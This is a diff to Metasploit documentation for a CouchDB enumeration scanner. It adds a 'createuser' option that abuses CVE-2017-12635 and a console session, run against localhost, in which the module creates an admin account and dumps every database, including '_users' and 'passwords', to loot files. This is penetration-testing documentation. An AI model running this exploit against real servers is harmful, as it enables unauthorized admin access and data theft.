@@ -24,6 +24,10 @@ The following was done on Ubuntu 16.04, and is largely base on [1and1.com](https
 
   If set to true, the server info will also enumerated and set in msf's DB.  Defaults to `false`
 
+  **createuser**
+
+  If set to true, the server info will attempt to create an account in CouchDB using configured credentials (limited to CVE-2017-12635 conditions). Defaults to `false`
+
 ## Scenarios
 
   A run against the configuration from these docs
@@ -69,5 +73,103 @@ The following was done on Ubuntu 16.04, and is largely base on [1and1.com](https
   Cache-Control: must-revalidate
   
   {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
+
+  Standard versus with credential creation
+  ========================================
+  msf > use auxiliary/scanner/couchdb/couchdb_enum
+  msf auxiliary(scanner/couchdb/couchdb_enum) > set rhost localhost
+  rhost => localhost
+  msf auxiliary(scanner/couchdb/couchdb_enum) > exploit
+
+  [*] localhost:5984 Enumerating Databases...
+  [+] localhost:5984 Databases:
+
+  [
+    "_global_changes",
+    "_metadata",
+    "_replicator",
+    "_users",
+    "passwords",
+    "simpsons"
+  ]
+
+  [+] localhost:5984 File saved in: /root/.msf4/loot/20180915211454_default_1_couchdb.enum_214468.bin
+  [-] Error retrieving database. Consider providing credentials.
+  [*] Auxiliary module execution completed
+
+  msf auxiliary(scanner/couchdb/couchdb_enum) > set createuser true
+  createuser => true
+  msf auxiliary(scanner/couchdb/couchdb_enum) > exploit
+
+  [+] Found CouchDB version 2.0.0
+  [+] User mlmUdhNZzDlI created with password password. Connect to http://localhost:5984/_utils/ to login.
+  [*] localhost:5984 Enumerating Databases...
+  [+] localhost:5984 Databases:
+
+  [
+    "_global_changes",
+    "_metadata",
+    "_replicator",
+    "_users",
+    "passwords",
+    "simpsons"
+  ]
+
+  [+] localhost:5984 File saved in: /root/.msf4/loot/20180915194926_default_1_couchdb.enum_131803.bin
+  [+] localhost:5984 _global_changes saved in: /root/.msf4/loot/20180915194926_default_1_couchdb._global__824779.bin
+  [+] localhost:5984 _metadata saved in: /root/.msf4/loot/20180915194926_default_1_couchdb._metadat_584893.bin
+  [+] localhost:5984 _replicator saved in: /root/.msf4/loot/20180915194926_default_1_couchdb._replica_443706.bin
+  [+] localhost:5984 _users saved in: /root/.msf4/loot/20180915194926_default_1_couchdb._users_870736.bin
+  [+] localhost:5984 passwords saved in: /root/.msf4/loot/20180915194926_default_1_couchdb.password_458174.bin
+  [+] localhost:5984 simpsons saved in: /root/.msf4/loot/20180915194926_default_1_couchdb.simpsons_842642.bin
+  [*] Auxiliary module execution completed
+
+  msf auxiliary(scanner/couchdb/couchdb_enum) > set httpusername mlmUdhNZzDlI
+  httpusername => mlmUdhNZzDlI
+  msf auxiliary(scanner/couchdb/couchdb_enum) > set httppassword password
+  httppassword => password
+  msf auxiliary(scanner/couchdb/couchdb_enum) > show options
+
+  Module options (auxiliary/scanner/couchdb/couchdb_enum):
+
+     Name          Current Setting  Required  Description
+     ----          ---------------  --------  -----------
+     CREATEUSER    true             yes       Create Administrative user - 
+     HttpPassword  password         yes       CouchDB Password
+     HttpUsername  mlmUdhNZzDlI     yes       CouchDB Username
+     Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+     RHOST         localhost        yes       CouchDB Host
+     ROLES         _admin           yes       CouchDB Roles
+     RPORT         5984             yes       CouchDB Port
+     SERVERINFO    false            yes       Print server info
+     SSL           false            no        Negotiate SSL/TLS for outgoing connections
+     TARGETURI     /_all_dbs        yes       Path to list all the databases
+     VHOST                          no        HTTP server virtual host
+
+  msf auxiliary(scanner/couchdb/couchdb_enum) > set createuser false
+  createuser => false
+  msf auxiliary(scanner/couchdb/couchdb_enum) > exploit
+
+  [*] localhost:5984 Enumerating Databases...
+  [+] localhost:5984 Databases:
+
+  [
+    "_global_changes",
+    "_metadata",
+    "_replicator",
+    "_users",
+    "passwords",
+    "simpsons"
+  ]
+
+  [+] localhost:5984 File saved in: /root/.msf4/loot/20180915211215_default_1_couchdb.enum_460766.bin
+  [+] localhost:5984 _global_changes saved in: /root/.msf4/loot/20180915211215_default_1_couchdb._global__821328.bin
+  [+] localhost:5984 _metadata saved in: /root/.msf4/loot/20180915211215_default_1_couchdb._metadat_410831.bin
+  [+] localhost:5984 _replicator saved in: /root/.msf4/loot/20180915211215_default_1_couchdb._replica_599375.bin
+  [+] localhost:5984 _users saved in: /root/.msf4/loot/20180915211216_default_1_couchdb._users_827774.bin
+  [+] localhost:5984 passwords saved in: /root/.msf4/loot/20180915211216_default_1_couchdb.password_361950.bin
+  [+] localhost:5984 simpsons saved in: /root/.msf4/loot/20180915211217_default_1_couchdb.simpsons_138031.bin
+  [*] Auxiliary module execution completed
+  msf auxiliary(scanner/couchdb/couchdb_enum) > 
 
   ```
